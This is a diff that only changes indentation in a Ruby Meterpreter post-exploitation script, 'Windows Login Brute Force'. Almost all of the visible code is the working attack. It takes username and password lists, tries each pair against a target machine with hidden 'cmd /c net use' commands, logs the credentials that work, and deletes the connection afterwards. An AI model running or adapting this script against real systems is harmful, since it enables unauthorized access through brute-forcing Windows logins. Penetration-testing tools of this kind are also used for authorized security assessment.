@@ -4,12 +4,12 @@
 #-------------------------------------------------------------------------------
 ################## Variable Declarations ##################
 @@exec_opts = Rex::Parser::Arguments.new(
-  "-h"  => [ false,  "\tHelp menu."],
-  "-t"  => [ true,  "\tTarget IP Address"],
-  "-p"  => [ true,  "\tPassword List"],
-  "-cp" => [ false,  "\tCheck Local Machine Password Policy"],
-  "-L"  => [ true,  "\tUsername List to be brute forced"],
-  "-l"  => [ true,  "\tLogin name to be brute forced"]
+	"-h"  => [ false,  "\tHelp menu."],
+	"-t"  => [ true,  "\tTarget IP Address"],
+	"-p"  => [ true,  "\tPassword List"],
+	"-cp" => [ false,  "\tCheck Local Machine Password Policy"],
+	"-L"  => [ true,  "\tUsername List to be brute forced"],
+	"-l"  => [ true,  "\tLogin name to be brute forced"]
 )
 # Variables for Options
 user = []
@@ -66,56 +66,56 @@ end
 def passbf(session,passlist,target,user,opt,logfile)
 	print_status("Running Brute force attack against #{user}")
 	print_status("Successfull Username and Password pairs are being saved in #{logfile}")
-  	result = []
+	result = []
 	output = []
 	passfnd = 0
-  	a = []
+	a = []
 	i = 0
 	if opt == 1
 		if not ::File.exists?(user)
 			raise "Usernames List File does not exists!"
-	       	else
-	    		user = ::File.open(user, "r")
-	    	end
+		else
+			user = ::File.open(user, "r")
+		end
 	end
 	# Go thru each user
 	user.each do |u|
 		# Go thru each line in the password file
 		while passfnd < 1
 			::File.open(passlist, "r").each_line do |line|
-		    		begin
-			      		print_status("Trying #{u.chomp} #{line.chomp}")
+				begin
+					print_status("Trying #{u.chomp} #{line.chomp}")
+					
+					# Command for testing local login credentials
+					r = session.sys.process.execute("cmd /c net use \\\\#{target} #{line.chomp} /u:#{u.chomp}", nil, {'Hidden' => true, 'Channelized' => true})
+					while(d = r.channel.read)
+						output << d
+					end
+					r.channel.close
+					r.close
+					
+					# Checks if password is found
+					result = output.to_s.scan(/The\scommand\scompleted\ssuccessfully/)
+					if result.length == 1
+						print_status("\tUser: #{u.chomp} pass: #{line.chomp} found")
+						file_local_write(logfile,"User: #{u.chomp} pass: #{line.chomp}")
+						r = session.sys.process.execute("cmd /c net use \\\\#{target} /delete", nil, {'Hidden' => true, 'Channelized' => true})
+						while(d = r.channel.read)
+							output << d
+						end
+						output.clear
+						r.channel.close
+						r.close
+						passfnd = 1
+						break
+					end
+				rescue ::Exception => e
+					print_status("The following Error was encountered: #{e.class} #{e}")
+				end
 
-		      			# Command for testing local login credentials
-			      		r = session.sys.process.execute("cmd /c net use \\\\#{target} #{line.chomp} /u:#{u.chomp}", nil, {'Hidden' => true, 'Channelized' => true})
-			      		while(d = r.channel.read)
-			       			 output << d
-			      		end
-			      		r.channel.close
-			      		r.close
-
-				      	# Checks if password is found
-			      		result = output.to_s.scan(/The\scommand\scompleted\ssuccessfully/)
-			      		if result.length == 1
-			       			print_status("\tUser: #{u.chomp} pass: #{line.chomp} found")
-			       			file_local_write(logfile,"User: #{u.chomp} pass: #{line.chomp}")
-			        		r = session.sys.process.execute("cmd /c net use \\\\#{target} /delete", nil, {'Hidden' => true, 'Channelized' => true})
-			        		while(d = r.channel.read)
-				       			 output << d
-				      		end
-				      		output.clear
-				      		r.channel.close
-			        		r.close
-			        		passfnd = 1
-			        		break
-			      		end
-			      	rescue ::Exception => e
-		    			print_status("The following Error was encountered: #{e.class} #{e}")
-		    		end
-
-		  	end
-		  	passfnd = 1
-		  end
+			end
+			passfnd = 1
+		end
 		passfnd = 0
 	end
 end
@@ -152,33 +152,31 @@ unsupported if client.platform !~ /win32|win64/i
 # Parsing of Options
 @@exec_opts.parse(args) { |opt, idx, val|
 	case opt
-	  when "-l"
-	    user << val
-	    ulopt = 0
-	  when "-L"
-	    userlist = val
-	    ulopt = 1
-
-	  when "-cp"
-	    chkpolicy(session)
-	    exit
-	  when "-p"
-
-	    	passlist = val
-	    	if not ::File.exists?(passlist)
-	    		raise "Password File does not exists!"
-	       	end
-	  when "-t"
-	    target = val
-	  when "-h"
-	    print(
-	      "Windows Login Brute Force Meterpreter Script\n" +
-	      "Usage:\n" +
-	        @@exec_opts.usage
-	    )
-	    helpcall = 1
-  end
-
+	when "-l"
+		user << val
+		ulopt = 0
+	when "-L"
+		userlist = val
+		ulopt = 1
+		
+	when "-cp"
+		chkpolicy(session)
+		exit
+	when "-p"
+		
+		passlist = val
+		if not ::File.exists?(passlist)
+			raise "Password File does not exists!"
+		end
+	when "-t"
+		target = val
+	when "-h"
+		print("Windows Login Brute Force Meterpreter Script\n" +
+			"Usage:\n" +
+			@@exec_opts.usage)
+		helpcall = 1
+	end
+	
 }
 
 # Execution of options selected
@@ -191,11 +189,9 @@ elsif userlist != nil && passlist != nil && target != nil
 	passbf(session,passlist,target,userlist,ulopt,logme(target))
 
 elsif helpcall == 0
+	print("Windows Login Brute Force Meterpreter Script\n" +
+		"Usage:\n" +
+		@@exec_opts.usage)
 
-	print(
-	      "Windows Login Brute Force Meterpreter Script\n" +
-	      "Usage:\n" +
-	        @@exec_opts.usage
-	    )
 end
 
